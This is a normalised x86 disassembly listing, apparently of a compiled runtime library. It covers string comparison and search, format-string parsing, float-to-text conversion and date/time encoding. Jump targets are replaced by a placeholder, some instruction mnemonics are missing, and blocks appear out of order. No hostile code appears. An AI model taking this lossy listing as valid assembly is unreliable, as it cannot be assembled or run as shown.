sub eax ecx
retn
test cl cl
je r-xdata
movzx ecx [ edx + eax + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
add eax 0x1
test cl cl
je r-xdata
movzx ecx [ edx + eax + 0x2 ]
cmp cl [ eax + 0x2 ]
jne r-xdata
add eax 0x1
test cl cl
je r-xdata
movzx ecx [ edx + eax + 0x3 ]
cmp cl [ eax + 0x3 ]
jne r-xdata
add eax 0x1
add eax 0x4
test cl cl
je r-xdata
sub eax 0x4
movzx ecx [ edx + eax ]
cmp cl [ eax ]
jne r-xdata
test cl cl
je r-xdata
movzx ecx [ edx + eax + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
test cl cl
je r-xdata
movzx ecx [ edx + eax + 0x2 ]
cmp cl [ eax + 0x2 ]
jne r-xdata
test cl cl
je r-xdata
movzx ecx [ edx + eax + 0x3 ]
cmp cl [ eax + 0x3 ]
jne r-xdata
add eax 0x4
test cl cl
jne r-xdata
sub_3a6a2b4
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_3a6a30c
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_3a6a394
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_3a6a120
mov esi eax
inc esi
mov eax esi
call sub_3a6a374
mov ecx esi
mov edx ebx
call sub_3a6a164
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_3a6a3d0
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_3a6dd58
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_3a6a164
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_3a690d4
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_3a6a458
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_3a6a7af
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_3a6a53a
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_3a6a582
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_3a6a53a
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_3a6a44c
pop edx
or edx edx
je r-xdata
sub_3a6a53a
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_3a6a7af
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_3a6a582
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_3a6a7af
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_3a6a3d0
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_3a6a5a9 ]
mov ebx ecx
sub cl 0x44
je sub_3a6988c
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_3a654c8
jmp r-xdata
mov esi sub_3a65528
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_3a6988c
sub cl 0x44
je sub_3a69820
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_3a69820
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_3a6988c
mov ecx 0x10
cmp bl 0x58
je sub_3a69820
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_3a6a428
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_3a6a984
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_3a69820
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_3a6a7d0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_3a6a120
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_3a6a458
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_3a6a810
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_3a6a120
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_3a6a458
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_3a6a864
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov ebx 0x1000
mov edx [ ebp - 0x4 ]
mov eax edx
test eax eax
je r-xdata
cmp eax 0xc00
jge r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax edx
test eax eax
je r-xdata
mov eax edx
test eax eax
je r-xdata
mov ebx eax
mov [ ebp - 0xc ] ebx
sub eax 0x4
mov eax [ eax ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x100c ]
mov edx 0xfff
call sub_3a6a458
mov [ ebp - 0xc ] eax
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
lea edx [ ebp - 0x100c ]
mov eax edi
mov ecx [ ebp - 0xc ]
call sub_3a65390
jmp r-xdata
mov eax ebx
dec eax
cmp eax [ ebp - 0xc ]
jg r-xdata
mov eax ebx
dec eax
cmp eax [ ebp - 0xc ]
jle r-xdata
add ebx ebx
mov eax edi
call sub_3a652a0
mov eax edi
mov edx ebx
call sub_3a659c0
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
mov eax edi
mov edx [ ebp - 0xc ]
call sub_3a659c0
jmp r-xdata
push esi
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ edi ]
call sub_3a6a458
mov [ ebp - 0xc ] eax
sub esi 0x4
mov esi [ esi ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_3a6a940
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_3a6a984
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_3a6ac58
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_3a6aa83
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_3a6aa8d
call sub_3a6aa83
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_3a6a940
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_3a6aae9
call sub_3a6aa83
call sub_3a6aa7a
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_3a6aa7a
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_3a6a940
retn
xor ecx ecx
sub_3a6ab25
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_3a6aa7a
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_3a6aa7a
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_3a6ab8a
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_3a6abde
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_3a6ab25
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_3a6ac58
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_3a6ac85
jmp r-xdata
call sub_3a6ada7
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_3a6ac85
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_3a63e5c
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_3a6ada7
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_3a6ae84
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_3a6af3b
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_3a6af46
neg edx
mov ecx esi
call sub_3a6af46
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_3a6af3b
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_3a6af62
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_3a63e5c
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_3a6af46
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_3a6af62
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_3a6af98
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_3a6a984
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_3a65390
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_3a6afc8
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_3a6a984
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_3a65390
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_3a6b014
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_3a65730
mov edx esp
xor ecx ecx
call sub_3a6ae84
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_3a6b040
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_3a65730
mov edx esp
xor ecx ecx
call sub_3a6ae84
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_3a6b088
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_3a6b0cc
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
movzx eax [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_3a6b13c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_3a6b0cc
test al al
jne r-xdata
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_3a690bc
sub_3a6b17c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_3a6b088
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_3a690a0
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_3a690a0
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_3a690a0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_3a6b1d8
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_3a6b214
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
movzx eax [ ebp - 0x2 ]
call sub_3a6b1d8
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
movzx eax [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_3a6b2e0
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_3a6b214
test al al
jne r-xdata
fld [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_3a690bc
sub_3a6b310
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
